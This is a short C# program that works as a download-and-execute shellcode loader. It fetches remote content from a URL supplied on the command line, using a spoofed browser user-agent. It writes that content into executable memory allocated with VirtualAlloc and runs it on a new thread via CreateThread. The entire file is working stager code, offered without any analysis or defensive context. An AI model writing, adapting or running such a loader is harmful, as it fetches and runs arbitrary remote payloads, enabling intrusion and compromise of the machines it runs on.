using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Importshellgit
{
    class Program

    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize, ulong flAllocationType, ulong flProtect);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, ulong dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        static void Main(string[] args)
        {
            WebClient client = new WebClient();

            client.Headers.Add("user-agent", @"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36");
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            string s = client.DownloadString(args[0]);
            Console.WriteLine(s);


            string input = s;
            byte[] buf = Encoding.ASCII.GetBytes(input);
            

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x00001000, 0x40);
            Marshal.Copy(buf, 0, addr, buf.Length);

            IntPtr th = CreateThread(IntPtr.Zero, (uint)buf.Length, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(th, 0xFFFFFFFF);

        }
    }
}




